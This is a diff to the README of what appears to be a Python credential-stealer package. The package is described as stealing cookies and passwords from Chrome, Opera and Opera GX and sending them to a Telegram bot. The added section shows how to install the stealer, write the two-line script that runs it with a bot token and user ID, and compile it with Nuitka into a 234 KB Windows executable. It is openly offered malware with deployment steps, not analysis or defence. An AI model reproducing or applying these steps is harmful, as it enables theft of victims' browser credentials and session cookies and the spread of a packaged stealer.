@@ -17,6 +17,9 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 * [Telegram bot setup](#Telegram-bot-setup)
   * [Getting token](#Getting-token)
   * [Getting id](#Getting-id)
+* [Creating .exe](#Creating-.exe)
+  * [Installing the required tools](#Installing-the-required-tools)
+  * [Creating executable file](#Creating-executable-file)
 
 ### Current features
 1. Collecting cookies and passwords of the following browsers: Chrome, Opera, Opera GX.
@@ -104,3 +107,33 @@ In the custom stealer, you need to prescribe the necessary browsers and the path
 </p>
 
 3. Insert the resulting ID into the ```YOUR_ID``` field in the script.
+
+## Creating .exe
+Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
+We will need Nuitka to do this.
+
+### Installing the required tools
+
+Installing Nuitka:
+```
+pip install Nuitka==0.6.16.4
+```
+
+Installing Stink:
+```
+pip install stink==0.0.3
+```
+
+### Creating executable file
+
+Create a test.py (or any other name) file with the following code:
+```python
+from stink.multistealer import Stealer
+
+Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+```
+Open a Python terminal. Go to the directory with the project and type the following command (or just open the terminal if you use PyCharm):
+```python
+nuitka --exe test.py
+```
+After executing the command, we get a test.exe file weighing 234 KB.
